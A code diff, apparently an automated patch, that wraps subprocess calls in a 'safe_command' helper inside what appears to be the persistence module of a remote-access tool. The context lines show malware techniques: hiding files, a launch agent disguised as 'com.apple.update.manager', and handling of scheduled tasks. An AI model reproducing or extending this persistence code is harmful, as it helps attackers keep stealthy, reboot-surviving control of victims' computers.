@@ -10,6 +10,7 @@ import base64
 import random
 import string
 import subprocess
+from security import safe_command
 
 # packages
 if sys.platform == 'win32':
@@ -112,11 +113,11 @@ def _add_hidden_file(value=None):
         if value and os.path.isfile(value):
             if os.name == 'nt':
                 path = value
-                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
+                hide = safe_command.run(subprocess.call, 'attrib +h {}'.format(path), shell=True) == 0
             else:
                 dirname, basename = os.path.split(value)
                 path = os.path.join(dirname, '.' + basename)
-                hide = subprocess.call('cp {} {}'.format(value, path), shell=True) == 0
+                hide = safe_command.run(subprocess.call, 'cp {} {}'.format(value, path), shell=True) == 0
             return (True if hide else False, path)
         else:
             util.log("File '{}' not found".format(value))
@@ -163,7 +164,7 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
                 bash = template_plist.substitute(LABEL=label, FILE=value)
                 with open(fpath, 'w') as fileobj:
                     fileobj.write(bash)
-                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                bin_sh = bytes().join(safe_command.run(subprocess.Popen, '/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 time.sleep(1)
                 launch_agent= os.path.join(os.environ.get('HOME'), 'Library/LaunchAgents/{}.plist'.format(label))
                 if os.path.isfile(launch_agent):
@@ -242,7 +243,7 @@ def _remove_scheduled_task():
     if _methods['scheduled_task'].established:
         value = _methods['scheduled_task'].result
         try:
-            if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
+            if safe_command.run(subprocess.call, 'SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                 return (False, None)
         except:
             pass
@@ -255,7 +256,7 @@ def _remove_hidden_file():
             if os.path.isfile(filename):
                 try:
                     unhide  = 'attrib -h {}'.format(filename) if os.name == 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
-                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+                    if safe_command.run(subprocess.call, unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return (False, None)
                 except Exception as e1:
                     util.log('{} error: {}'.format(_remove_hidden_file.__name__, str(e1)))
